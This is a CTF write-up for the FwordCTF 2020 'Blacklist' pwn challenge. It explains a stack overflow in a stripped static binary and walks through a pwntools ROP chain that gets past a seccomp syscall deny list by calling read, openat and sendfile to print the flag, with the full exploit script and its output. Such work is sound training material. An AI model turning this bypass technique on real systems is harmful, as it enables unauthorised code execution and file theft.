# FwordCTF 2020

## Blacklist (postmortem)

> 499
> 
> Welcome agent, i have a new name for you, but it's not gonna be easy to find it. Can you figure it out ? Remember agent, the blacklist name is under your "fbi" home directory in a file named : 
> 
> ```
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa
kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa
uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
faabgaabhaabiaabjaabkaablaabmaabnaaboaab
paabqaabraabsaabtaabuaabvaabwaabxaabyaab
zaacbaaccaacdaaceaacfaacgaachaaciaacjaac
kaaclaacma.txt
> ```
> 
>  Raymond Red.
>
> `nc blacklist.fword.wtf 1236`
>
> Author : haflout
>
> [`Blacklist`](blacklist)

Tags: _pwn_ _x86-64_ _bof_ _rop_ _syscall_


## Summary

`blacklist` is statically linked, stripped, outputs nothing, and is further constrained by seccomp.

Syscalls alone _can_ solve this problem.

> This challenge is not unlike [_syscall as a service_](https://github.com/datajerk/ctf-write-ups/blob/master/nahamconctf2020/saas/README.md), a syscall training task from the NahamCon CTF 2020 (I highly recommend this as a syscall trainer).  This problem is similar; a blacklist, and you need to use syscalls to read and emit a flag.  I decided to use this approach, however there were are some differences, e.g. no `write`, and I also got hung up on emitting `rax` when I didn't need to.  I put this aside to work on other problems and just did not get back to this.  After reading [BigB00st's](https://github.com/BigB00st) excellent [writeup](https://github.com/BigB00st/ctf-solutions/tree/master/fword/pwn/blacklist), I got the bits I missed, 1. `fd` should be constant, 2. `sendfile` as a replacement for `write`, 3. use the BSS space (don't waste time with the heap).  With this in hand the problem became surprisingly simple.
> 
> This writeup while not exactly the same, is, well, the same; full props to [BigB00st](https://github.com/BigB00st).


## Analysis

### File

```
blacklist: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked,
BuildID[sha1]=8231fd8232118e3b92ca37d041e1da3ab1daf4d9, for GNU/Linux 3.2.0, stripped
```

Stripped and statically linked.  I wasted ~30 minutes in Ghidra trying to reverse this.  Not a good used of time.  Even GDB can be painful without symbols.


### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE/ASLR is key.  Static linked binaries have a wealth of options for ROP chains, but nothing like having all of libc.  `ropper --file blacklist` returns 19607 gadgets.  Everything we need should be here.

No canary?  BOF/ROP is an option.


### Blacklist (seccomp)

`seccomp-tools dump ./blacklist`:

```c
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x15 0xc000003e  if (A != ARCH_X86_64) goto 0023
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x12 0xffffffff  if (A != 0xffffffff) goto 0023
 0005: 0x15 0x11 0x00 0x00000001  if (A == write) goto 0023
 0006: 0x15 0x10 0x00 0x00000002  if (A == open) goto 0023
 0007: 0x15 0x0f 0x00 0x00000012  if (A == pwrite64) goto 0023
 0008: 0x15 0x0e 0x00 0x00000014  if (A == writev) goto 0023
 0009: 0x15 0x0d 0x00 0x00000038  if (A == clone) goto 0023
 0010: 0x15 0x0c 0x00 0x00000039  if (A == fork) goto 0023
 0011: 0x15 0x0b 0x00 0x0000003a  if (A == vfork) goto 0023
 0012: 0x15 0x0a 0x00 0x0000003b  if (A == execve) goto 0023
 0013: 0x15 0x09 0x00 0x0000003e  if (A == kill) goto 0023
 0014: 0x15 0x08 0x00 0x00000065  if (A == ptrace) goto 0023
 0015: 0x15 0x07 0x00 0x000000c8  if (A == tkill) goto 0023
 0016: 0x15 0x06 0x00 0x00000113  if (A == splice) goto 0023
 0017: 0x15 0x05 0x00 0x00000128  if (A == pwritev) goto 0023
 0018: 0x15 0x04 0x00 0x00000130  if (A == open_by_handle_at) goto 0023
 0019: 0x15 0x03 0x00 0x00000135  if (A == getcpu) goto 0023
 0020: 0x15 0x02 0x00 0x00000142  if (A == execveat) goto 0023
 0021: 0x15 0x01 0x00 0x00000148  if (A == pwritev2) goto 0023
 0022: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0023: 0x06 0x00 0x00 0x00000000  return KILL
```

No `write`.

_Black_ has multiple meanings here; _GOT?_, garbage; _symbols?_, what symbols?; _output?_, we're in the dark.

The last seccomp challenge I worked on I ended up using a combination of GOT and syscalls.  I tried to make sense of the GOT, but I _got_ nowhere.

    
### Decompile with Ghidra

Don't waste your time.


### Guess BOF

After all of the above I just went for it and typed:

```bash
# cyclic 1000 | ./blacklist
Segmentation fault
```

Boom! We have a vulnerability.

Finding the offset in GDB was trivial as well.  72.

Given the constraints above, attempt to `read` in the file name, open with `openat` (frequent alternative to `open`), and then use `sendfile` to emit to stdout (hat tip to [BigB00st](https://github.com/BigB00st/ctf-solutions/tree/master/fword/pwn/blacklist))


## Exploit

### Setup

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./blacklist')
context.log_level = 'INFO'
context.log_file = 'log.log'

flagfile = '/home/fbi/aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma.txt'
filesize = 100 # guess?
```

Most of this is boilerplate except for `flagfile` and `filesize`.

The name of the flag is given in the challenge description.  The prepended directory is a guess (_under your "fbi" home directory_).  It is necessary to use the full path name or `openat` will not work (trust me, I tried).  `openat` requires a `dirfd` if not absolute.  The challenge with `dirfd` is we have to find a way to either emit `rax` or move to `rdi`.  This is not impossible (I did try to get `rax` to `rdi` and `rsi`, I think at that point it's best to just upload shellcode and use `mprotect` (other write ups used that method)).

As for `filesize`, no idea how long the flag is.  `100` was a guess for the upper limit.


### Find offset

```python
# find offset
p = process(binary.path)
p.sendline(cyclic(1024,n=8))
p.wait()
core = p.corefile
p.close()
os.remove(core.file.name)
offset = cyclic_find(core.read(core.rsp, 8),n=8)
log.info('offset: ' + str(offset))
log.info('rip: ' + hex(core.rip))
```

While the offset has already been determined I still like to have it computed, and the reported `rip` is a useful reminder for what to set my breakpoint to when attaching a debugger (which I had to, to find the `fd` value, and troubleshoot).


### Find gadgets

```python
try:
    rop = ROP([binary])
    pop_rax = rop.find_gadget(['pop rax','ret'])[0]
    pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
    pop_rsi = rop.find_gadget(['pop rsi','ret'])[0]
    pop_rdx = rop.find_gadget(['pop rdx','ret'])[0]
    pop_r10 = list(binary.search(asm('pop r10; ret')))[0]
    pop_r9  = list(binary.search(asm('pop r9;  ret')))[0]
    pop_r8  = list(binary.search(asm('pop r8;  ret')))[0]
    sys_ret = list(binary.search(asm('syscall; ret')))[0]
except:
    log.info('no ROP for you!')
    sys.exit(0)
```    

This is a frequent problem with pwnlib; it will not find all gadgets.  Using `asm` and `search` to fill in the gaps is a common stopgap (for me at least).

I was actually surprised all of them were there.


### Generic syscall function

```python
def syscall(rax=None,rdi=None,rsi=None,rdx=None,r10=None,r9=None,r8=None):
    assert(rax != None)
    payload = b''
    if rdi != None: payload += p64(pop_rdi) + p64(rdi)
    if rsi != None: payload += p64(pop_rsi) + p64(rsi)
    if rdx != None: payload += p64(pop_rdx) + p64(rdx)
    if r10 != None: payload += p64(pop_r10) + p64(r10)
    if r9  != None: payload += p64(pop_r9)  + p64(r9)
    if r8  != None: payload += p64(pop_r8)  + p64(r8)
    return payload + p64(pop_rax) + p64(rax) + p64(sys_ret)
```    

This is similar with what I did for [_syscall as a service_](https://github.com/datajerk/ctf-write-ups/blob/master/nahamconctf2020/saas/README.md).

The parameters are in Linux ABI order so one just needs to type `man 2 syscall name`, and call `syscall` with first the name of the syscall, e.g. `constants.SYS_read.real`, followed by the arguments in the same order as the man page.

> NOTE: It is import that `binary.context` is set (see Setup section), or pwnlib `constants` will default to `i386`.


### Get the flag

```
#p = process(binary.path)
p = remote('blacklist.fword.wtf', 1236)

fd = 3
payload  = offset * b'A'
payload += syscall(constants.SYS_read.real,constants.STDIN_FILENO.real,binary.bss(),len(flagfile))
payload += syscall(constants.SYS_openat.real,0,binary.bss(),0)
payload += syscall(constants.SYS_sendfile.real,constants.STDOUT_FILENO.real,fd,0,filesize)

p.sendline(payload)
p.send(flagfile)
log.info(p.recv(filesize))
```

Kind of anticlimactic at this point.  Just three syscalls.

> `fd` needs to be found manually (I guess one could script GDB).  I just set a breakpoint at `*0x401dd3` (RIP, reported from the core file above) before sending the payload and followed step by step until the `openat` syscall.  `rax` (`fd`) was always 3.

Output:

```
# ./exploit.py
[*] '/pwd/datajerk/fwordctf2020/blacklist/blacklist'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/pwd/datajerk/fwordctf2020/blacklist/blacklist': pid 23913
[*] Process '/pwd/datajerk/fwordctf2020/blacklist/blacklist' stopped with exit code -11 (SIGSEGV) (pid 23913)
[!] Found bad environment at 0x7fff65577fbc
[+] Parsing corefile...: Done
[*] '/pwd/datajerk/fwordctf2020/blacklist/core.23913'
    Arch:      amd64-64-little
    RIP:       0x401dd3
    RSP:       0x7fff65576108
    Exe:       '/pwd/datajerk/fwordctf2020/blacklist/blacklist' (0x401000)
    Fault:     0x616161616161616a
[*] offset: 72
[*] rip: 0x401dd3
[*] Loaded 126 cached gadgets for './blacklist'
[+] Opening connection to blacklist.fword.wtf on port 1236: Done
[*] b'FwordCTF{th3_n4M3_1s_El1Z4be7h_K33n}\n\n'
```